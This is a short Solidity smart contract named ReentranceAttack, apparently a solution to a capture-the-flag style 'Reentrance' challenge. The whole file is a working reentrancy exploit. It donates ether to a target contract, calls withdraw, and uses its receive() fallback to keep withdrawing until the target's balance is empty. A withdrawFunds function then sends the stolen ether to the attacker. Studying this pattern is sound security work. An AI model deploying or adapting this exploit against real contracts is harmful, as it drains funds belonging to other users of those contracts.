// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address to) external payable;
    function withdraw(uint256 amount) external;
}

contract ReentranceAttack {
    IReentrance public reentrance;
    address payable public owner;

    constructor(address _reentrance) public {
        owner = msg.sender;
        reentrance = IReentrance(_reentrance);
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether, "Need to send atleast 0.001 ether");
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 targetBalance = address(reentrance).balance;
        if (targetBalance >= 0.001 ether) {
            reentrance.withdraw(0.001 ether);
        }
        else if (targetBalance > 0) {
            reentrance.withdraw(targetBalance);
        }
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "You are not the owner of this contract.");
        owner.transfer(address(this).balance);
    }

}